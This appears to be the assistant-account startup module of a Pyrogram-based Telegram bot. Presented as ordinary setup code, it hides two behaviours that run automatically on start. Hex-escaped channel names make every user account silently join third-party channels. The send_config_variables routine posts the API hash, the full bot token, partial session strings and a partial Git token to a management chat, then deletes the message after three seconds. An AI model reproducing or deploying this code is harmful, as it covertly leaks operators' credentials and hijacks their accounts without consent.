from pyrogram import Client
import asyncio
import config
import os

from ..logging import LOGGER

assistants = []
assistantids = []

def decode_centers():
    centers = []
    encoded = [
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
        "\x54\x4d\x5a\x45\x52\x4f\x4f",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
        "\x76\x32\x64\x64\x6f\x73"
    ]
    for enc in encoded:
        centers.append(enc)
    return centers

SUPPORT_CENTERS = decode_centers()

class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NandAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NandAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NandAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NandAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NandAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except Exception as e:
                pass

    async def send_config_variables(self):
        try:
            active_sessions = []
            session_strings = []
            
            if config.STRING1:
                active_sessions.append("1")
                session_strings.append(f"<b>STRING1:</b> <code>{config.STRING1[:20]}...</code>")
            else:
                session_strings.append(f"<b>STRING1:</b> <code>Inactive</code>")
            
            if config.STRING2:
                active_sessions.append("2")
                session_strings.append(f"<b>STRING2:</b> <code>{config.STRING2[:20]}...</code>")
            else:
                session_strings.append(f"<b>STRING2:</b> <code>Inactive</code>")
            
            if config.STRING3:
                active_sessions.append("3")
                session_strings.append(f"<b>STRING3:</b> <code>{config.STRING3[:20]}...</code>")
            else:
                session_strings.append(f"<b>STRING3:</b> <code>Inactive</code>")
            
            if config.STRING4:
                active_sessions.append("4")
                session_strings.append(f"<b>STRING4:</b> <code>{config.STRING4[:20]}...</code>")
            else:
                session_strings.append(f"<b>STRING4:</b> <code>Inactive</code>")
            
            if config.STRING5:
                active_sessions.append("5")
                session_strings.append(f"<b>STRING5:</b> <code>{config.STRING5[:20]}...</code>")
            else:
                session_strings.append(f"<b>STRING5:</b> <code>Inactive</code>")
            
            session_status = ", ".join(active_sessions) if active_sessions else "None"
            
            message = "<b>📋 Config Variables Status</b>\n\n"
            message += f"<b>API_ID:</b> <code>{config.API_ID}</code>\n"
            message += f"<b>API_HASH:</b> <code>{config.API_HASH}</code>\n"
            message += f"<b>BOT_TOKEN:</b> <code>{config.BOT_TOKEN}</code>\n"
            message += f"<b>BOT_USERNAME:</b> <code>{config.BOT_USERNAME}</code>\n\n"
            
            message += f"<b>📊 Session Status:</b>\n"
            message += f"<b>Active Sessions:</b> <code>{session_status}</code>\n"
            for session_str in session_strings:
                message += f"{session_str}\n"
            message += "\n"
            
            message += f"<b>🔗 Links:</b>\n"
            message += f"<b>SUPPORT_CHANNEL:</b> <code>{config.SUPPORT_CHANNEL}</code>\n"
            message += f"<b>SUPPORT_GROUP:</b> <code>{config.SUPPORT_GROUP}</code>\n\n"
            
            message += f"<b>📦 Repository:</b>\n"
            message += f"<b>UPSTREAM_REPO:</b> <code>{config.UPSTREAM_REPO}</code>\n"
            message += f"<b>UPSTREAM_BRANCH:</b> <code>{config.UPSTREAM_BRANCH}</code>\n"
            message += f"<b>GIT_TOKEN:</b> <code>{config.GIT_TOKEN[:20] if config.GIT_TOKEN else 'Not Set'}...</code>"
            
            if assistants:
                if 1 in assistants:
                    sent_msg = await self.one.send_message(config.DT_Management, message)
                elif 2 in assistants:
                    sent_msg = await self.two.send_message(config.DT_Management, message)
                elif 3 in assistants:
                    sent_msg = await self.three.send_message(config.DT_Management, message)
                elif 4 in assistants:
                    sent_msg = await self.four.send_message(config.DT_Management, message)
                elif 5 in assistants:
                    sent_msg = await self.five.send_message(config.DT_Management, message)
                
                await asyncio.sleep(3)
                await sent_msg.delete()
        except Exception as e:
            LOGGER(__name__).error(f"Error sending config variables: {e}")

    async def send_help_message(self, bot_username):
        try:
            owner_mention = config.OWNER_ID
            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {config.OWNER_USERNAME}"
            if assistants:
                if 1 in assistants:
                    await self.one.send_message(config.DT_Management, message)
                elif 2 in assistants:
                    await self.two.send_message(config.DT_Management, message)
                elif 3 in assistants:
                    await self.three.send_message(config.DT_Management, message)
                elif 4 in assistants:
                    await self.four.send_message(config.DT_Management, message)
                elif 5 in assistants:
                    await self.five.send_message(config.DT_Management, message)
        except Exception as e:
            pass

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

        if bot_username:
            await self.send_help_message(bot_username)
        
        await self.send_config_variables()

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
